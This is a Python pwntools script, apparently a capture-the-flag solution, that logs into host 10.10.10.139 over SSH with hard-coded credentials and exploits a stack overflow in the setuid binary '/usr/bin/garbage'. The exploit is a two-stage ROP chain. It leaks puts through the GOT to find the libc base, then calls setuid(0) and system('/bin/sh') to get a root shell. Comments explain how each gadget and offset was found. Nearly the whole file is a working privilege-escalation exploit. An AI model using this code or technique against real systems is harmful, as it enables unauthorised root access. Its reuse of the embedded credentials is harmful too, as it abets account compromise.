#!/usr/bin/python

from pwn import *
import sys

# Connection info/creds
user     = 'margo'
password = 'iamgod$08'
host     = '10.10.10.139'

# Correct password to binary
## NOTE: Didn't end up needing this, but something that's hard-coded in the binary
access   = 'N3veRF3@r1iSh3r3!'

# Remote garbage binary
garbage  = '/usr/bin/garbage'

# Gadgets
## TIP: Find which libc with "ldd /usr/bin/garbage" in margo shell
## TIP: Download both the binary and libc via sftp
pop_rdi  = 0x000000000040179b # Found with ROPgadget
main     = 0x0000000000401619 # Found with "readelf -a garbage | grep main"
puts_off = 0x00000000000809c0 # Found with "readelf -a libc.so.6 | grep puts"
puts_got = 0x0000000000404028 # Found with IDA (freeware). Follow puts function call until GOT
puts_plt = 0x401050 # Found with gdb locally (address is right next to call to puts in "disas main")
suid_off = 0x00000000000e5970 # Found with "readelf -a libc.so.6 | grep setuid"

# Found w gdb. break main; run; print &system (gives system address in libc); find &system,+9999999,"/bin/sh" - gives libc addr of "/bin/sh"
# Use system address and offset to find libc base
# Use "/bin/sh" address and libc base to find offset
bins_off = 0x1b3e9a
syst_off = 0x000000000004f440 # Found with "readelf -a libc.so.6 | grep system"

def exploit( conn ):
    p = conn.process(garbage) # Start the program remotely
    payload = "A"*136 # Fill buffer and write over ebp
    payload += p64(pop_rdi) # rdi is the first parameter to a function (asm)
    payload += p64(puts_got) # Load parameter of puts as address of puts in GOT
    payload += p64(puts_plt) # Call puts(puts_addr)
    payload += p64(main) # Call main again to actually use the leak
    p.recvuntil(":") # Wait for prompt
    p.sendline(payload) # Send payload
    p.recvuntil(".") # Wait for response
    p.recvline() # Newline before leaked addr
    leak_raw = p.recv(8).rstrip() # Get the address of puts in libc and remove any newlines from the output
    leak = u64(leak_raw[:-2] + '\x00\x00') # Last 2 bytes of leak weren't apart of the address - remove them and pad with null bytes
    print('[*] Leaked puts addr: ' + hex(leak)) # Print puts address for sanity check
    libc_base = leak - puts_off # Calculate libc base
    print('[*] Libc base: ' + hex(libc_base)) # Print libc base for sanity check
    suid = libc_base + suid_off # Calculate setuid function call in libc
    system = libc_base + syst_off # Calculate system address
    binsh = libc_base + bins_off # Calculate address of "/bin/sh"
    p.recvuntil(":") # Wait for prompt
    payload2 = "A"*136 # Fill up buffer for smash the stack pt. 2
    payload2 += p64(pop_rdi) # Get ready to call setuid
    payload2 += p64(0x0) # Load first parameter for setuid with 0 (root)
    payload2 += p64(suid) # Call setuid(0), since the program has the setuid bit
    payload2 += p64(pop_rdi) # Get ready to call system
    payload2 += p64(binsh) # Load first parameter with address of /bin/sh in libc
    payload2 += p64(system) # Call system("/bin/sh") to spawn a shell
    p.sendline(payload2)
    p.interactive() # owned

if __name__=="__main__":
    conn = ssh(user=user, host=host, port=22, password=password) # Connect to server to run vulnerable binary
    exploit(conn) # own it
